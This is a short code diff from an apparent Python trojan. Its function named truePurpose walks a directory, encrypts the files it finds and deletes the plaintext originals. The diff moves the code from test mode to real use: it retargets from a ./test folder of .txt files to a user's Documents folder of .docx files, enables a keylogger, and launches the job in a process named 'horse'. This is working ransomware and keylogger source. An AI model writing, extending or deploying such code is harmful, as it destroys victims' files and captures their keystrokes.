@@ -18,19 +18,18 @@ def truePurpose(target_directory: str):
         target_directory: the directory to ecrypt
     """
 
-    # trojan.keylogger.start_logger()
     c: Crawler = Crawler(target_directory, extension_white_list=[
-                         '.txt'], abs_path=True)
+                         '.docx'], abs_path=True)
     c.walk_tree()
     filesToEncrypt: List[str] = c.get_files()
     for s in filesToEncrypt:
         print("DEBUG: main.truePurpose(): encrypting " + s)
         encryptAndDeletePlaintext(s)
+    trojan.keylogger.start_logger()
 
 
 if __name__ == "__main__":
-    # For now, we'll encrypt all files in the test directory, that are a txt file.
-    p: Process = Process(target=truePurpose, args=["./test"])
+    p: Process = Process(target=truePurpose, args=["/home/nick/Documents"])
     p.name: str = "horse"
     p.start()
 
